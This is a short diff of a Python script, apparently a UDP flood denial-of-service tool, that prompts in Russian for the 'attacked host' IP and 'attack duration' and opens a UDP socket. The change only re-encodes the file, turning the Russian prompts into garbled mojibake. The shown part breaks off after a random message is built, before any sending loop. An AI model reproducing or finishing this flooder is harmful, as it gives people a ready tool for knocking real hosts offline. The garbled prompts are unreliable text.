@@ -1,11 +1,10 @@
-# -*- coding: cp1251 -*-
-import time
+п»їimport time
 import socket
 import random
 import sys
 
-victim_ip = str(input('IP - адрес атакуемого хоста: '))
-duration = int(input('Продолжительность атаки (с): '))
+victim_ip = str(input('IP - Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
+duration = int(input('РџСЂРѕРґРѕР»Р¶РёС‚РµР»СЊРЅРѕСЃС‚СЊ Р°С‚Р°РєРё (СЃ): '))
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 msg = bytes(random.getrandbits(10))
